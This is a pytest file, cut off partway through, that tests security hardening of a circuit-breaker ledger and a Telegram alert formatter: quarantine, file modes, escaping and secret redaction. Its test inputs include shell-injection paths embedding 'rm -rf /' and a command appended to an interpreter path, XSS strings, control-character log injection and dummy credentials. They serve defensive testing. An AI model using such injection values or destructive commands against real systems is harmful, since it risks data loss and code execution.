def test_type_confusion_ledger_applies_conservative_hold(tmp_path, caplog):
    """CWE-20 / CWE-754: Type confusion payloads (non-dict, strings, bools, NaN, Inf) apply bounded conservative hold."""
    state_file = tmp_path / "type_confused_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)

    scripts_dir = tmp_path / "scripts_type_confusion"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    bad_payloads = [
        ["a", "list", "instead", "of", "dict"],
        {"circuit_open_until": "soon", "failures": 3},
        {"circuit_open_until": True, "failures": 3},
        {"circuit_open_until": None, "failures": 3},
        {"circuit_open_until": float("nan"), "failures": 3},
        {"circuit_open_until": float("inf"), "failures": 3},
        {"circuit_open_until": -float("inf"), "failures": 3},
    ]

    for payload in bad_payloads:
        state_file.write_text(json.dumps(payload), encoding="utf-8")
        status = SelfHealingManager.get_circuit_status()
        assert status["is_open"] is True, f"Failed conservative hold check for {payload}"
        assert 0.0 < status["cooldown_remaining"] <= SelfHealingManager._CORRUPT_FAILSAFE_HOLD_S
        assert "hold" in (status["reason"] or "")

    # Reset clears hold and allows self-healing to proceed
    SelfHealingManager.reset_circuit_breaker()
    assert not state_file.exists()
    status_after_reset = SelfHealingManager.get_circuit_status()
    assert status_after_reset["is_open"] is False

    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_persistent_corrupt_ledger_quarantines_and_recovers(tmp_path, caplog):
    """CWE-20/CWE-754: Repeated corrupt reads must not stack holds indefinitely; file is quarantined after first hold."""
    state_file = tmp_path / "corrupt.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()
    state_file.write_text("{not json")

    s1 = SelfHealingManager.get_circuit_status()
    assert s1["is_open"] is True
    # Poison must be quarantined, not left to re-trigger rolling holds
    assert not state_file.exists()
    assert any("corrupt" in p.name for p in tmp_path.iterdir())

    # Fast forward past 30s hold (both wall clock and monotonic)
    # Once hold elapses, absent ledger must fail CLOSED, not re-hold!
    with patch("time.monotonic", return_value=time.monotonic() + 35.0):
        with patch("time.time", return_value=time.time() + 35.0):
            s2 = SelfHealingManager.get_circuit_status()
            assert s2["is_open"] is False
            assert s2["cooldown_remaining"] == 0.0

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_ledger_epoch_increments_monotonically(tmp_path):
    """Epoch Counter Contract: Ledger generation counter increments on trip, reset, and quarantine."""
    state_file = tmp_path / "epoch_test_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    e0 = SelfHealingManager.get_circuit_status()["epoch"]

    # Trip breaker bumps epoch
    SelfHealingManager._trip_circuit_breaker("epoch_test_trip")
    e1 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e1 > e0

    # Persisted ledger carries epoch
    with open(state_file, "r", encoding="utf-8") as fh:
        saved = json.load(fh)
    assert saved["epoch"] == e1

    # Reset bumps epoch
    SelfHealingManager.reset_circuit_breaker()
    e2 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e2 > e1

    # Corrupt ledger quarantine bumps epoch
    state_file.write_text("corrupted_content")
    SelfHealingManager.get_circuit_status()
    e3 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e3 > e2

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_monotonic_clock_anchoring_prevents_forward_wall_clock_bypass(tmp_path):
    """CWE-367 / CWE-1244: Forward wall-clock jumps cannot collapse in-process cooldown window."""
    SelfHealingManager.reset_circuit_breaker()
    state_file = tmp_path / "monotonic_test_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)

    scripts_dir = tmp_path / "scripts_mono_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Trip breaker
    SelfHealingManager._trip_circuit_breaker("test_monotonic_trip")
    initial_status = SelfHealingManager.get_circuit_status()
    assert initial_status["is_open"] is True
    assert initial_status["cooldown_remaining"] > 0.0

    # Simulate an attacker or NTP sync jumping wall clock forward by 10,000 seconds
    wall_now = time.time()
    with patch("time.time", return_value=wall_now + 10000.0):
        # Monotonic time is NOT patched, so in-process monotonic cooldown is still active!
        status_after_clock_jump = SelfHealingManager.get_circuit_status()
        assert status_after_clock_jump["is_open"] is True, "Circuit collapsed despite monotonic anchor!"
        assert status_after_clock_jump["cooldown_remaining"] > 0.0

        with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN"):
            mgr.ensure_wrapper_script()

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_no_fcntl_logs_warning_and_uses_atomic_replace(tmp_path, caplog, monkeypatch):
    """CWE-362: When fcntl is None, single structured warning is logged, and ledger is published via atomic replace."""
    import logging
    state_file = tmp_path / "no_fcntl_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager._warned_no_fcntl = False

    # Monkeypatch fcntl in module
    import tools.hourly_digest_monitor as hdm
    monkeypatch.setattr(hdm, "fcntl", None)

    with caplog.at_level(logging.WARNING):
        SelfHealingManager._trip_circuit_breaker("test_no_fcntl_trip")

    # Verify single structured warning 'flock_unavailable' was logged
    flock_warns = [
        json.loads(r.message) for r in caplog.records
        if "flock_unavailable" in r.message
    ]
    assert len(flock_warns) == 1
    assert flock_warns[0]["event"] == "flock_unavailable"

    # Trip again; verify _warned_no_fcntl prevents duplicate warning spam
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        SelfHealingManager._trip_circuit_breaker("test_no_fcntl_second_trip")
    assert not any("flock_unavailable" in r.message for r in caplog.records)

    # Verify state file was written atomically and can be read
    assert state_file.exists()
    status = SelfHealingManager.get_circuit_status()
    assert status["is_open"] is True

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_reason_sanitization_strips_control_characters_and_bounds_length(tmp_path):
    """CWE-117: Persisted reason field is bounded to 256 chars and stripped of non-printable characters."""
    state_file = tmp_path / "sanitize_reason_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Injected reason with ANSI escape code, control chars, newlines, and 500 characters
    malicious_reason = "\x1b[31;1mCRITICAL_INJECTION\x00\r\n\x08" + "B" * 500

    SelfHealingManager._trip_circuit_breaker(malicious_reason)

    assert state_file.exists()
    with open(state_file, "r", encoding="utf-8") as fh:
        saved_state = json.load(fh)

    clean_reason = saved_state["reason"]
    # 1. Bounded to at most 256 characters
    assert len(clean_reason) <= 256
    # 2. Only printable characters allowed
    assert all(ch.isprintable() for ch in clean_reason)
    assert "\x00" not in clean_reason
    assert "\r" not in clean_reason
    assert "\n" not in clean_reason
    assert "\x1b" not in clean_reason
    assert "CRITICAL_INJECTION" in clean_reason

    # 3. Reading status also preserves clean reason
    status = SelfHealingManager.get_circuit_status()
    assert status["reason"] == clean_reason

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_ledger_flock_cross_process_mutual_exclusion(tmp_path):
    """CWE-362: Advisory fcntl.flock on .circuit_breaker.lock serializes across processes."""
    if fcntl is None:
        pytest.skip("fcntl not available on platform")

    state_file = tmp_path / "flock_test_ledger.json"
    lock_file = tmp_path / "flock_test_ledger.json.lock"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Enter lock via context manager
    with SelfHealingManager._with_ledger_lock():
        assert lock_file.exists(), "Lock file was not created by _with_ledger_lock"
        # In a separate file descriptor, an exclusive non-blocking lock must be rejected!
        other_fd = os.open(str(lock_file), os.O_RDWR)
        try:
            with pytest.raises((BlockingIOError, OSError)):
                fcntl.flock(other_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        finally:
            os.close(other_fd)

    # After exiting the with block, lock must be released so other fd can acquire
    other_fd = os.open(str(lock_file), os.O_RDWR)
    try:
        fcntl.flock(other_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        fcntl.flock(other_fd, fcntl.LOCK_UN)
    finally:
        os.close(other_fd)

    # Test re-entrant lock execution
    def inner_call():
        return "re_entered"

    res = SelfHealingManager._with_ledger_lock(inner_call)
    assert res == "re_entered"

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_security_artifacts_are_not_world_writable(tmp_path):
    """CWE-732 / Restrictive Modes Invariant: All security artifacts must satisfy mode & 0o022 == 0."""
    state_file = tmp_path / "mode_test_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    scripts_dir = tmp_path / "scripts_mode_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    wp, digest = mgr.ensure_wrapper_script()
    manifest_path = scripts_dir / ".hermes_hourly_digest.sh.manifest"

    # Verify wrapper is 0o700 and manifest is 0o600
    assert (wp.stat().st_mode & 0o022) == 0
    assert (manifest_path.stat().st_mode & 0o022) == 0
    assert (scripts_dir.stat().st_mode & 0o022) == 0

    # Plant insecure permissions (e.g. 0o777 on wrapper, 0o666 on manifest)
    os.chmod(wp, 0o777)
    os.chmod(manifest_path, 0o666)
    assert (wp.stat().st_mode & 0o022) != 0
    assert (manifest_path.stat().st_mode & 0o022) != 0

    # ensure_wrapper_script must detect and harden both
    wp2, _ = mgr.ensure_wrapper_script()
    assert (wp2.stat().st_mode & 0o022) == 0
    assert (manifest_path.stat().st_mode & 0o022) == 0

    # Trip breaker and verify ledger and lock permissions
    SelfHealingManager._trip_circuit_breaker("test_mode_hardening")
    assert state_file.exists()
    assert (state_file.stat().st_mode & 0o022) == 0
    lock_file = tmp_path / "mode_test_ledger.json.lock"
    if lock_file.exists():
        assert (lock_file.stat().st_mode & 0o022) == 0

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_wrapper_render_shell_escaping_with_metacharacters(tmp_path):
    """CWE-78: Wrapper generation escapes malicious shell metacharacters in paths and passes bash syntax check."""
    malicious_repo = tmp_path / 'evil "$(rm -rf /)" ; `touch /tmp/pwn` && echo \'hacked\''
    malicious_python = '/usr/bin/python3; echo "injected"'
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=malicious_repo,
        python_bin=malicious_python,
        scripts_dir=tmp_path / "scripts",
    )

    wrapper_content, digest = mgr.render_wrapper_content()

    # 1. Ensure quotes prevent evaluation
    assert f"REPO_DIR={shlex.quote(str(malicious_repo))}" in wrapper_content
    assert f"exec {shlex.quote(malicious_python)}" in wrapper_content

    # 2. Verify bash syntax check passes with code 0
    res = subprocess.run(
        ["bash", "-n"],
        input=wrapper_content,
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0, f"Bash syntax check failed: {res.stderr}\nWrapper:\n{wrapper_content}"


def test_repeated_corruption_bounds_quarantine_artifacts(tmp_path, caplog):
    """CWE-400: Ring buffer eviction caps total quarantine artifacts to _MAX_QUARANTINE_ARTIFACTS to prevent inode exhaustion."""
    import logging
    state_file = tmp_path / "repeated_corrupt.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    max_artifacts = SelfHealingManager._MAX_QUARANTINE_ARTIFACTS  # 5
    num_corruptions = max_artifacts + 5  # 10 distinct payloads

    with caplog.at_level(logging.INFO):
        for i in range(num_corruptions):
            # Write unique poison bytes so each has a unique sha256
            state_file.write_text(f"unique_poison_payload_{i}_{time.time()}", encoding="utf-8")
            SelfHealingManager.get_circuit_status()

    # Verify that total quarantine artifacts on disk <= _MAX_QUARANTINE_ARTIFACTS
    prefix = f".{state_file.name}.corrupt."
    quarantine_files = [p for p in tmp_path.iterdir() if p.name.startswith(prefix)]
    assert len(quarantine_files) <= max_artifacts
    assert len(quarantine_files) == max_artifacts

    # Verify that SIEM 'quarantine_evicted' was logged
    evicted_events = [
        json.loads(r.message) for r in caplog.records
        if "quarantine_evicted" in r.message
    ]
    assert len(evicted_events) >= 5
    assert evicted_events[0]["event"] == "quarantine_evicted"
    assert evicted_events[0]["max_artifacts"] == max_artifacts

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_identical_corrupt_content_deduplicates_quarantine_artifacts(tmp_path, caplog):
    """CWE-400 / Content-Addressing: Repeated identical poison bytes collapse to a single deduplicated artifact."""
    import logging
    state_file = tmp_path / "dedup_corrupt.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    identical_poison = "{not valid json payload identical"

    with caplog.at_level(logging.WARNING):
        for _ in range(5):
            state_file.write_text(identical_poison, encoding="utf-8")
            SelfHealingManager.get_circuit_status()

    # Exactly 1 quarantine file created with that sha256 digest
    prefix = f".{state_file.name}.corrupt."
    quarantine_files = [p for p in tmp_path.iterdir() if p.name.startswith(prefix)]
    assert len(quarantine_files) == 1

    digest = hashlib.sha256(identical_poison.encode("utf-8")).hexdigest()[:32]
    expected_name = f".{state_file.name}.corrupt.{digest}"
    assert quarantine_files[0].name == expected_name

    # Check SIEM logs for deduplicated events
    corrupt_events = [
        json.loads(r.message) for r in caplog.records
        if "circuit_ledger_corrupt" in r.message
    ]
    assert len(corrupt_events) == 5
    # First is not deduplicated, remaining 4 are deduplicated
    assert corrupt_events[0]["deduplicated"] is False
    assert corrupt_events[0]["quarantined"] is True
    for ev in corrupt_events[1:]:
        assert ev["deduplicated"] is True
        assert ev["quarantined"] is True

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_epoch_monotonicity_persists_across_process_restart(tmp_path):
    """Epoch Monotonicity Across Restarts: In-memory resets or process restart reload epoch from .epoch marker file."""
    state_file = tmp_path / "restart_epoch_ledger.json"
    epoch_file = tmp_path / f".{state_file.name}.epoch"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Trip breaker
    SelfHealingManager._trip_circuit_breaker("restart_test_trip_1")
    e1 = SelfHealingManager.get_circuit_status()["epoch"]
    assert epoch_file.exists()
    assert int(epoch_file.read_text(encoding="utf-8").strip()) == e1

    # Simulate process restart: wipe in-memory variables
    SelfHealingManager._ledger_epoch = 0
    SelfHealingManager._wrapper_circuit_open_until = 0.0
    SelfHealingManager._wrapper_circuit_open_until_mono = 0.0
    SelfHealingManager._wrapper_circuit_reason = None
    SelfHealingManager._circuit_state_file = None

    # Re-initialize with same state_file -> should load epoch from marker
    SelfHealingManager.set_circuit_state_file(state_file)
    status_reloaded = SelfHealingManager.get_circuit_status()
    assert status_reloaded["epoch"] >= e1

    # Next trip must increment beyond e1, not restart at 1
    SelfHealingManager._trip_circuit_breaker("restart_test_trip_2")
    e2 = SelfHealingManager.get_circuit_status()["epoch"]
    assert e2 > e1
    assert int(epoch_file.read_text(encoding="utf-8").strip()) == e2

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_html_entity_escaping_prevents_telegram_parse_errors(tmp_path):
    """CWE-116: User-controlled and error strings in Telegram alerts are escaped with html.escape."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    # Injected strings with HTML tags, ampersands, quotes, and brackets
    malicious_scan = {
        "overall_health_score": 30,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "clogged_jobs": [
                {
                    "job_name": "job<script>alert(1)</script>&foo",
                    "consecutive_failures": 5,
                    "last_error": "SyntaxError: <unknown> & unescaped 'quotes' \"here\"",
                }
            ],
            "drift_skipped_jobs": [
                {
                    "job_name": "drift<style>body{display:none}</style>&bar",
                    "model_snapshot": "snapshot&v=1<test>",
                }
            ],
            "auth_failed_jobs": [
                {
                    "job_name": "auth&job<img src=x onerror=alert(2)>",
                    "last_error": "Token expired & invalid_grant <details>",
                }
            ],
            "ticker_heartbeat": {"is_stale": True, "age_seconds": 150.0},
        },
        "entropy": {
            "entropy_health_score": 20,
            "streams": [
                {
                    "name": "Stock News & Feeds <inject>",
                    "status": "CRITICAL",
                    "hours_since_crawl": 99.0,
                    "articles_24h": 0,
                    "unique_symbols": 0,
                }
            ],
        },
    }

    alert_html = notifier.format_urgent_alert(malicious_scan)
    # Raw unescaped dangerous tags must NOT be present
    assert "<script>" not in alert_html
    assert "</script>" not in alert_html
    assert "<style>" not in alert_html
    assert "<img" not in alert_html
    assert "<inject>" not in alert_html
    # Escaped tags must be present
    assert "&lt;script&gt;" in alert_html
    assert "&amp;foo" in alert_html
    assert "&amp; invalid_grant" in alert_html

    digest_html = notifier.format_hourly_digest(malicious_scan)
    assert "<inject>" not in digest_html
    assert "&lt;inject&gt;" in digest_html


def test_truncation_never_splits_html_entities(tmp_path):
    """CWE-116: Truncating before escaping guarantees entities cannot be sliced into dangling fragments."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    scan = {
        "overall_health_score": 30,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "clogged_jobs": [
                {
                    "job_name": "clogged_job_test",
                    "consecutive_failures": 1,
                    # Force char 120 to land where an entity would split if sliced after escape
                    "last_error": ("x" * 119) + "&&&&&",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    # Assert no dangling ampersand fragment
    dangling = re.search(r"&(?!amp;|lt;|gt;|quot;|#x27;|#\d+;)", out)
    assert dangling is None, f"Dangling entity detected in formatted alert: {out}"
    assert "&amp;" in out


def test_token_shaped_error_is_redacted(tmp_path):
    """CWE-532: Error strings with Bearer tokens, OAuth access tokens, or secrets are redacted before formatting."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "auth_failed_jobs": [
                {
                    "job_name": "oauth-sync",
                    "last_error": "Bearer ya29.A0ARrdaM-SECRETTOKENVALUE123456 rejected with refresh_token=1//04abcdef123456",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert "ya29.A0ARrdaM-SECRETTOKENVALUE123456" not in out
    assert "1//04abcdef123456" not in out
    assert "04abcdef123456" not in out
    assert "//04" not in out
    assert "A0ARrdaM" not in out
    assert "SECRETTOKENVALUE123456" not in out
    assert "[REDACTED]" in out


@pytest.mark.parametrize("length", [98, 99, 100, 101, 118, 119, 120, 121])
@pytest.mark.parametrize("special_char", ["&", "<", ">", "\"", "'", "<script>"])
def test_boundary_truncation_entity_integrity(tmp_path, length, special_char):
    """CWE-116: Verify that error messages ending at boundary lengths never produce broken entities or unescaped tags."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    err_text = ("a" * length) + special_char + "tail"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "clogged_jobs": [{"job_name": "boundary_test", "consecutive_failures": 3, "last_error": err_text}],
            "auth_failed_jobs": [{"job_name": "auth_test", "last_error": err_text}],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert re.search(r"&(?!amp;|lt;|gt;|quot;|#x27;|#\d+;)", out) is None
    assert "<script>" not in out


def test_google_refresh_token_body_fully_redacted(tmp_path):
    """CWE-532: Google OAuth refresh tokens (1//...) are fully redacted without partial leakage."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    secret_body = "04AbCdEfGhIjKlMnOpQrStUvWxYz_1234567890"
    token = f"1//{secret_body}"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "gdrive-sync",
                    "consecutive_failures": 3,
                    "last_error": f"Failed refresh with token {token} and code 401",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert secret_body not in out
    assert "1//" not in out
    assert "[REDACTED]" in out


def test_base64_token_with_slash_and_plus_redacted(tmp_path):
    """CWE-532: Tokens containing base64 characters (+, /, =) are redacted as a whole."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    frag_slash = "partAfterSlash99"
    frag_plus = "partAfterPlus88"
    b64_token = f"Bearer aHR0cHM6Ly9leGFtcGxl/{frag_slash}+{frag_plus}===="
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "auth_failed_jobs": [
                {
                    "job_name": "api-sync",
                    "last_error": f"Invalid token header: {b64_token} denied",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert frag_slash not in out
    assert frag_plus not in out
    assert "[REDACTED]" in out


def test_db_url_password_redacted_cwe259(tmp_path):
    """CWE-259: Database connection URLs have passwords sanitized with [REDACTED]."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    db_pass = "SuperSecret_Passw0rd-2026!"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "db-backup",
                    "consecutive_failures": 3,
                    "last_error": f"Failed: postgresql://db_user:{db_pass}@postgres.internal:5432/main_db",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert db_pass not in out
    assert "postgresql://db_user:[REDACTED]@postgres.internal:5432/main_db" in out

    mysql_url = "mysql://root:s3cr3tPassword@localhost:3306/hermes"
    mongo_url = "mongodb+srv://admin:P4ssw0rd!@cluster0.mongodb.net/test"
    redacted = notifier.redact_secrets(f"{mysql_url} {mongo_url}")
    assert "s3cr3tPassword" not in redacted
    assert "P4ssw0rd!" not in redacted
    assert "mysql://root:[REDACTED]@localhost:3306/hermes" in redacted
    assert "mongodb+srv://admin:[REDACTED]@cluster0.mongodb.net/test" in redacted


def test_long_telegram_bot_token_is_redacted(tmp_path):
    """CWE-532: Long Telegram bot tokens with >10 digit bot IDs (e.g. 13-digit) are redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    secret_part = "AAFlkjdsf098324_lkasdjflkasjdflkj"
    bot_token = f"1234567890123:{secret_part}"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "tg-worker",
                    "consecutive_failures": 4,
                    "last_error": f"Connection error to bot {bot_token} on webhook",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert secret_part not in out
    assert "1234567890123:" not in out
    assert "[REDACTED]" in out


def test_non_string_last_error_does_not_crash(tmp_path):
    """CWE-532: Non-string error values (None, int, dict, Exception) do not crash redaction or formatting."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    for bad_val in [None, 503, {"error": "internal"}, RuntimeError("database offline")]:
        scan = {
            "overall_health_score": 20,
            "severity": "CRITICAL",
            "cron": {
                "clogged_jobs": [
                    {
                        "job_name": "resilient-job",
                        "consecutive_failures": 3,
                        "last_error": bad_val,
                    }
                ],
                "auth_failed_jobs": [
                    {
                        "job_name": "auth-resilient",
                        "last_error": bad_val,
                    }
                ],
                "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
            },
        }
        out = notifier.format_urgent_alert(scan)
        assert isinstance(out, str)
        assert "resilient-job" in out
        assert "auth-resilient" in out


def test_secret_straddling_truncation_boundary(tmp_path):
    """CWE-532 / CWE-116: Secrets straddling the truncation boundary are redacted before truncation."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    prefix = "A" * 110
    secret_token = "ya29.STRADDLE_TOKEN_BODY_BOUNDARY_TEST_1234567890"
    full_err = prefix + " " + secret_token
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "straddle-clog",
                    "consecutive_failures": 3,
                    "last_error": full_err,
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert "STRADDLE_TOKEN_BODY_BOUNDARY_TEST" not in out
    assert "1234567890" not in out
    assert "ya29." not in out


def test_generic_credentials_and_api_keys_redacted(tmp_path):
    """CWE-532 / CWE-259: Generic credentials, cloud API keys, and KV secrets are redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    aiza_key = "AIzaSyD-1234567890abcdefghijklmnopqrstu"
    aws_key = "AKIAIOSFODNN7EXAMPLE"
    slack_tok = "xoxb-123456789012345678"
    pw_val = "SuperSecretP@ss!"
    secret_val = "TopSecretVaultVal99"
    api_key_val = "MyCustomAPIKey12345"
    client_secret_val = "OAuthClientSecretVal456"
    pem_val = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0123456789\n-----END RSA PRIVATE KEY-----"

    test_err = (
        f"google_key={aiza_key} aws={aws_key} slack={slack_tok} "
        f"password=\"{pw_val}\" secret: {secret_val} "
        f"api_key: \"{api_key_val}\" client_secret = '{client_secret_val}'\n{pem_val}"
    )

    redacted = notifier.redact_secrets(test_err)
    assert aiza_key not in redacted
    assert aws_key not in redacted
    assert slack_tok not in redacted
    assert pw_val not in redacted
    assert secret_val not in redacted
    assert api_key_val not in redacted
    assert client_secret_val not in redacted
    assert "0123456789" not in redacted
    assert "[REDACTED_PRIVATE_KEY]" in redacted
    assert "[REDACTED]" in redacted


def analyze_redos_vulnerabilities(pattern_str: str) -> List[str]:
    """Statically inspects a regex pattern for known catastrophic backtracking constructs.

    NOTE: This is a best-effort structural analyzer for test canaries and credential
    patterns, using balanced-parentheses stack inspection to detect nested quantifiers,
    N-way overlapping alternations, and unescaped greedy wildcards.
    """
    issues = []

    # 1. Balanced-parentheses stack inspection to find groups and their quantifiers
    groups = []  # (start_idx, end_idx, inner_content, quantifier)
    stack = []
    i = 0
    n = len(pattern_str)
    in_char_class = False

    while i < n:
        c = pattern_str[i]
        if c == "\\":
            i += 2
            continue
        if c == "[" and not in_char_class:
            in_char_class = True
            i += 1
            # In regex, a ']' immediately after '[' or '[^' is a literal ']' character, not the closing delimiter
            if i < n and pattern_str[i] == "^":
                i += 1
            if i < n and pattern_str[i] == "]":
                i += 1
            continue
        if c == "]" and in_char_class:
            in_char_class = False
            i += 1
            continue
        if not in_char_class:
            if c == "(":
                stack.append(i)
            elif c == ")":
                if stack:
                    start = stack.pop()
                    end = i
                    rem = pattern_str[end + 1 :]
                    q_match = re.match(r"^([\+\*]|\{\d+(?:,\d*)?\})\??", rem)
                    quantifier = q_match.group(0) if q_match else None
                    groups.append((start, end, pattern_str[start + 1 : end], quantifier))
        i += 1

    if stack:
        issues.append(
            f"UNANALYZABLE: unbalanced groups ({len(stack)} unclosed '(') - "
            "static ReDoS analysis is incomplete for this pattern"
        )

    def strip_char_classes(s: str) -> str:
        out = []
        in_cls = False
        idx = 0
        while idx < len(s):
            ch = s[idx]
            if ch == "\\":
                if in_cls:
                    out.append("x")
                else:
                    out.append(s[idx : idx + 2])
                idx += 2
                continue
            if ch == "[" and not in_cls:
                in_cls = True
                out.append("[")
                idx += 1
                # In regex, a ']' immediately after '[' or '[^' is a literal ']' character, not the closing delimiter
                if idx < len(s) and s[idx] == "^":
                    out.append("x")
                    idx += 1
                if idx < len(s) and s[idx] == "]":
                    out.append("x")
                    idx += 1
                continue
            if ch == "]" and in_cls:
                in_cls = False
                out.append("]")
                idx += 1
                continue
            if in_cls:
                out.append("x")
            else:
                out.append(ch)
            idx += 1
        return "".join(out)

    def split_top_level_alts(s: str) -> List[str]:
        alts = []
        curr = []
        idx = 0
        depth = 0
        in_cls = False
        while idx < len(s):
            ch = s[idx]
            if ch == "\\":
                curr.append(s[idx : idx + 2])
                idx += 2
                continue
            if ch == "[" and not in_cls:
                in_cls = True
                curr.append(ch)
